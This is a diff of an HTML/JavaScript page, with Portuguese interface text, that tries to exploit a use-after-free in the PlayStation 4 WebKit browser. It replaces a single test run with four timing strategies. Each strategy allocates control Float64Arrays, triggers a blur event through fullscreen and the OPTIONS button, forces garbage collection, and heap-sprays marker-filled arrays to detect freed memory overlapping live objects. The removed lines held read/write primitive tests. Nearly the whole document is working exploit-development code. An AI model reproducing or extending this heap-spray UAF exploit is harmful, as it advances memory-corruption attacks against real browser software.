@@ -1,29 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - Debugger Core [v2.0 - Anti-FalsePositive]</h1>
-    <button onclick="run()">EXECUTAR TESTE</button>
+    <h1>PS4 UAF - Multi-Timing Strategies [v3.0]</h1>
+    <button onclick="strategy1()">ESTRATÉGIA 1: Clássica (blur imediato)</button><br><br>
+    <button onclick="strategy2()">ESTRATÉGIA 2: GC Forçado (delay 100ms)</button><br><br>
+    <button onclick="strategy3()">ESTRATÉGIA 3: Spray Duplo (pre+post)</button><br><br>
+    <button onclick="strategy4()">ESTRATÉGIA 4: Loop Agressivo (10 tentativas)</button><br><br>
     <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
     <hr>
     <div id="c"></div>
 
     <script>
-        // Padrões de teste (IEEE 754 double precision)
-        const P_A = 2.121995791e-314;      // 0x4141414141414141
-        const P_B = 2.122007583e-314;      // 0x4242424242424242
-        const P_C = 2.122019376e-314;      // 0x4343434343434343
-        const M_V = 3.395193267e-313;      // 0xDEADBEEFCAFEBABE
-        const W_V = 1.6045690773137395e-297; // 0x1337133713371337
-
-        function f2h(f) {
-            let b = new ArrayBuffer(8);
-            (new Float64Array(b))[0] = f;
-            let u = new Uint32Array(b);
-            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
-        }
-
         function h2f(hex) {
             let clean = hex.replace(/0x/g, '');
+            if(clean.length !== 16) return 0.0;
             let hi = parseInt(clean.slice(0, 8), 16);
             let lo = parseInt(clean.slice(8, 16), 16);
             let b = new ArrayBuffer(8);
@@ -32,173 +22,259 @@
             return (new Float64Array(b))[0];
         }
 
+        function f2h(f) {
+            let b = new ArrayBuffer(8);
+            (new Float64Array(b))[0] = f;
+            let u = new Uint32Array(b);
+            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
+        }
+
+        const P_A = h2f("0x4141414141414141");
+        const P_B = h2f("0x4242424242424242");
+        const M_V = h2f("0xDEADBEEFCAFEBABE");
+        const W_V = h2f("0x1337133713371337");
+
         function log(tag, status, msg) {
             const colors = { PASS: "green", FAIL: "red", ERR: "orange", INFO: "blue", WARN: "purple" };
             const color = colors[status] || "black";
-            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
+            document.getElementById('c').innerHTML += 
+                `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
+        }
+
+        function clear() {
+            document.getElementById('c').innerHTML = '';
+        }
+
+        function forceGC() {
+            // Tenta forçar garbage collection
+            const trash = [];
+            for(let i = 0; i < 1000; i++) {
+                trash.push(new Float64Array(100));
+            }
+            trash.length = 0;
+        }
+
+        function testUAF(ctrls, spray) {
+            for(let i = 0; i < ctrls.length; i++) {
+                if(ctrls[i][0] === P_A) {
+                    log("UAF", "PASS", `✅ Detectado no Index ${i}`);
+                    
+                    // Teste rápido de identidade
+                    ctrls[i][4] = M_V;
+                    for(let j = 0; j < spray.length; j++) {
+                        if(spray[j][4] === M_V) {
+                            log("TEST", "PASS", `Identity confirmada: corr ⇄ spray[${j}]`);
+                            return { success: true, corr: ctrls[i], idx: i };
+                        }
+                    }
+                    return { success: true, corr: ctrls[i], idx: i };
+                }
+            }
+            return { success: false };
         }
 
         function selfTest() {
-            document.getElementById('c').innerHTML = '';
+            clear();
             log("SELF", "INFO", "=== AUTO-DIAGNÓSTICO ===");
             
-            // Test 1: Conversão f2h
             const tests = [
-                { val: P_A, exp: "0x4141414141414141", name: "P_A" },
-                { val: P_B, exp: "0x4242424242424242", name: "P_B" },
-                { val: M_V, exp: "0xdeadbeefcafebabe", name: "M_V" },
-                { val: W_V, exp: "0x1337133713371337", name: "W_V" }
+                { hex: "0x4141414141414141", name: "P_A" },
+                { hex: "0xdeadbeefcafebabe", name: "M_V" }
             ];
             
-            let failures = 0;
+            let ok = true;
             for(let t of tests) {
-                const got = f2h(t.val);
-                if(got === t.exp) {
+                const val = h2f(t.hex);
+                const got = f2h(val);
+                if(got.toLowerCase() === t.hex.toLowerCase()) {
                     log("SELF", "PASS", `${t.name}: ${got}`);
                 } else {
-                    log("SELF", "FAIL", `${t.name}: esperado ${t.exp}, obtido ${got}`);
-                    failures++;
+                    log("SELF", "FAIL", `${t.name}: ${got} != ${t.hex}`);
+                    ok = false;
                 }
             }
             
-            // Test 2: Conversão reversa
-            const rev = h2f("0xdeadbeefcafebabe");
-            if(f2h(rev) === "0xdeadbeefcafebabe") {
-                log("SELF", "PASS", "h2f reverso OK");
-            } else {
-                log("SELF", "FAIL", `h2f reverso: ${f2h(rev)}`);
-                failures++;
-            }
-            
-            // Test 3: Float64Array básico
             const arr = new Float64Array(2);
             arr[0] = P_A;
             arr[1] = M_V;
-            if(f2h(arr[0]) === "0x4141414141414141" && f2h(arr[1]) === "0xdeadbeefcafebabe") {
-                log("SELF", "PASS", "Float64Array primitives OK");
+            if(f2h(arr[0]) === f2h(P_A) && f2h(arr[1]) === f2h(M_V)) {
+                log("SELF", "PASS", "Float64Array OK");
             } else {
-                log("SELF", "FAIL", `Array: [0]=${f2h(arr[0])}, [1]=${f2h(arr[1])}`);
-                failures++;
+                log("SELF", "FAIL", "Float64Array corrompido");
+                ok = false;
             }
             
-            if(failures === 0) {
-                log("SELF", "PASS", "✅ Sistema OK - Pode prosseguir com o teste UAF");
+            if(ok) {
+                log("SELF", "PASS", "✅ Sistema OK - Tente as estratégias de timing");
             } else {
-                log("SELF", "FAIL", `❌ ${failures} falhas detectadas - NÃO execute o teste UAF!`);
+                log("SELF", "FAIL", "❌ Sistema incompatível - Não é PS4?");
             }
         }
 
-        function run() {
-            document.getElementById('c').innerHTML = '';
+        // ESTRATÉGIA 1: Clássica (blur imediato)
+        function strategy1() {
+            clear();
+            log("S1", "INFO", "=== ESTRATÉGIA 1: Blur Imediato ===");
+            log("S1", "INFO", "Criando 5000 ctrls...");
             
-            // Validação pré-teste
-            if(f2h(P_A) === "0x0000000000000000") {
-                log("INIT", "FAIL", "❌ ERRO CRÍTICO: Padrões de teste zerados! Execute AUTO-DIAGNÓSTICO.");
-                return;
-            }
-            
-            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
             let ctrls = [];
             for(let i = 0; i < 5000; i++) {
-                let a = new Float64Array(8);
-                a[0] = i; 
-                ctrls.push(a);
+                ctrls.push(new Float64Array(8));
+                ctrls[i][0] = i;
             }
             
-            log("INIT", "PASS", `Padrões: P_A=${f2h(P_A)}, M_V=${f2h(M_V)}`);
-            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
+            log("S1", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
             document.documentElement.webkitRequestFullscreen();
-
+            
             window.onblur = function() {
-                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
+                log("S1", "INFO", "Blur! Spray imediato...");
                 
                 let spray = [];
                 for(let i = 0; i < 8000; i++) {
-                    let s = new Float64Array(8);
-                    s.fill(P_A);
-                    spray.push(s);
+                    spray.push(new Float64Array(8));
+                    spray[i].fill(P_A);
                 }
                 
-                // Validação do spray
-                if(f2h(spray[0][0]) !== f2h(P_A)) {
-                    log("SPRAY", "FAIL", `Spray corrompido: esperado ${f2h(P_A)}, obtido ${f2h(spray[0][0])}`);
-                    return;
+                const result = testUAF(ctrls, spray);
+                if(!result.success) {
+                    log("S1", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 2.");
                 }
-                
-                let corr = null, corrIdx = -1;
-                for(let i = 0; i < ctrls.length; i++) {
-                    if(ctrls[i][0] === P_A) {
-                        corr = ctrls[i];
-                        corrIdx = i;
-                        log("UAF", "PASS", `Index ${i}: corr[0]=${f2h(corr[0])}`);
-                        break;
-                    }
-                }
+            };
+        }
 
-                if(!corr) {
-                    log("UAF", "FAIL", "Nenhuma corrupção detectada.");
-                    return;
-                }
-
-                // TEST 1: Identidade Bidirecional
-                log("TEST1", "INFO", "--- Identity Test (Bidirecional) ---");
-                corr[4] = M_V;
+        // ESTRATÉGIA 2: GC Forçado com delay
+        function strategy2() {
+            clear();
+            log("S2", "INFO", "=== ESTRATÉGIA 2: GC Forçado ===");
+            log("S2", "INFO", "Criando 5000 ctrls...");
+            
+            let ctrls = [];
+            for(let i = 0; i < 5000; i++) {
+                ctrls.push(new Float64Array(8));
+                ctrls[i][0] = i;
+            }
+            
+            log("S2", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
+            document.documentElement.webkitRequestFullscreen();
+            
+            window.onblur = function() {
+                log("S2", "INFO", "Blur! Forçando GC...");
+                forceGC();
                 
-                let matched = false;
-                for(let i = 0; i < spray.length; i++) {
-                    if(spray[i][4] === M_V) {
-                        // Teste reverso
-                        spray[i][5] = W_V;
-                        if(corr[5] === W_V) {
-                            log("TEST1", "PASS", `Bidirecional OK: corr⇄spray[${i}]`);
-                            log("TEST1", "PASS", `Forward: corr[4]→spray=${f2h(M_V)}`);
-                            log("TEST1", "PASS", `Reverse: spray[5]→corr=${f2h(W_V)}`);
-                            matched = true;
-                        } else {
-                            log("TEST1", "WARN", `Unidirecional: corr→spray OK, spray→corr FAIL`);
-                        }
-                        break;
-                    }
-                }
-                
-                if(!matched) {
-                    log("TEST1", "FAIL", `M_V não encontrado. corr[4]=${f2h(corr[4])}, spray[0][4]=${f2h(spray[0][4])}`);
-                }
-
-                // TEST 2: DataView Write Primitive
-                log("TEST2", "INFO", "--- DataView Write ---");
-                try {
-                    const dv = new DataView(corr.buffer);
-                    const before = f2h(corr[0]);
-                    dv.setUint32(0, 0xDEADBEEF, true);
-                    const after = f2h(corr[0]);
+                setTimeout(function() {
+                    log("S2", "INFO", "Spray após 100ms...");
                     
-                    if(before !== after && after.includes("deadbeef")) {
-                        log("TEST2", "PASS", `Write: ${before} → ${after}`);
-                    } else {
-                        log("TEST2", "FAIL", `Sem mudança: ${before} → ${after}`);
+                    let spray = [];
+                    for(let i = 0; i < 8000; i++) {
+                        spray.push(new Float64Array(8));
+                        spray[i].fill(P_A);
                     }
-                } catch(e) { log("TEST2", "ERR", e.message); }
-
-                // TEST 3: Prototype Pollution
-                log("TEST3", "INFO", "--- Prototype Hijack ---");
-                try {
-                    let reg = Array.from(corr);
-                    Object.setPrototypeOf(reg, { token: 0xCAFEBABE });
                     
-                    if(reg.token === 0xCAFEBABE) {
-                        log("TEST3", "PASS", `Token injetado: 0x${reg.token.toString(16)}`);
-                    } else {
-                        log("TEST3", "FAIL", "Token não propagado");
+                    const result = testUAF(ctrls, spray);
+                    if(!result.success) {
+                        log("S2", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 3.");
                     }
-                } catch(e) { log("TEST3", "ERR", e.message); }
+                }, 100);
+            };
+        }
 
-                // TEST 4: Closure Leak
-                log("TEST4", "INFO", "--- Closure Leak ---");
-                try {
-                    const leaked = [0].map(() => corr[0])[0];
-                    log("TEST4", "PASS", `Leak: ${f2h(leaked)}`);
-                } catch(e) { log("TEST4", "ERR", e.message); }
+        // ESTRATÉGIA 3: Spray Duplo (antes E depois do blur)
+        function strategy3() {
+            clear();
+            log("S3", "INFO", "=== ESTRATÉGIA 3: Spray Duplo ===");
+            log("S3", "INFO", "Criando pre-spray de 3000 arrays...");
+            
+            let preSpray = [];
+            for(let i = 0; i < 3000; i++) {
+                preSpray.push(new Float64Array(8));
+                preSpray[i].fill(P_B); // Padrão diferente
+            }
+            
+            log("S3", "INFO", "Criando 5000 ctrls...");
+            let ctrls = [];
+            for(let i = 0; i < 5000; i++) {
+                ctrls.push(new Float64Array(8));
+                ctrls[i][0] = i;
+            }
+            
+            log("S3", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
+            document.documentElement.webkitRequestFullscreen();
+            
+            window.onblur = function() {
+                log("S3", "INFO", "Blur! Post-spray...");
+                
+                let postSpray = [];
+                for(let i = 0; i < 8000; i++) {
+                    postSpray.push(new Float64Array(8));
+                    postSpray[i].fill(P_A);
+                }
+                
+                const result = testUAF(ctrls, postSpray);
+                if(!result.success) {
+                    log("S3", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 4 (mais agressiva).");
+                }
+            };
+        }
+
+        // ESTRATÉGIA 4: Loop Agressivo (10 tentativas com timings diferentes)
+        function strategy4() {
+            clear();
+            log("S4", "INFO", "=== ESTRATÉGIA 4: Loop Agressivo ===");
+            log("S4", "WARN", "10 tentativas automáticas - NÃO saia do fullscreen!");
+            log("S4", "INFO", "Aguarde fullscreen, então aperte OPTIONS UMA VEZ");
+            
+            let ctrls = [];
+            for(let i = 0; i < 5000; i++) {
+                ctrls.push(new Float64Array(8));
+                ctrls[i][0] = i;
+            }
+            
+            document.documentElement.webkitRequestFullscreen();
+            
+            let attemptCount = 0;
+            window.onblur = function() {
+                if(attemptCount === 0) {
+                    log("S4", "INFO", "Blur detectado! Iniciando loop...");
+                }
+                
+                attemptCount++;
+                log("S4", "INFO", `Tentativa ${attemptCount}/10...`);
+                
+                // GC forçado
+                forceGC();
+                
+                // Delay variável (0ms, 50ms, 100ms, 200ms...)
+                const delays = [0, 50, 100, 150, 200, 300, 500, 750, 1000, 1500];
+                const delay = delays[attemptCount - 1] || 1000;
+                
+                setTimeout(function() {
+                    let spray = [];
+                    const spraySize = 8000 + (attemptCount * 1000); // Aumenta gradualmente
+                    
+                    for(let i = 0; i < spraySize; i++) {
+                        spray.push(new Float64Array(8));
+                        spray[i].fill(P_A);
+                    }
+                    
+                    log("S4", "INFO", `Spray: ${spraySize} arrays, delay: ${delay}ms`);
+                    
+                    const result = testUAF(ctrls, spray);
+                    
+                    if(result.success) {
+                        log("S4", "PASS", `✅ SUCESSO na tentativa ${attemptCount}!`);
+                        log("S4", "INFO", `Configuração vencedora: delay=${delay}ms, spray=${spraySize}`);
+                        window.onblur = null; // Para o loop
+                    } else if(attemptCount >= 10) {
+                        log("S4", "FAIL", "❌ 10 tentativas falharam");
+                        log("S4", "INFO", "POSSÍVEIS CAUSAS:");
+                        log("S4", "INFO", "1. Firmware tem proteções anti-UAF (>= 10.00?)");
+                        log("S4", "INFO", "2. Não é PS4 (testando em PC?)");
+                        log("S4", "INFO", "3. WebKit muito antigo/novo");
+                        log("S4", "WARN", "RECOMENDAÇÃO: Verifique firmware e ambiente");
+                    } else {
+                        log("S4", "INFO", "Continuando...");
+                    }
+                }, delay);
             };
         }
     </script>
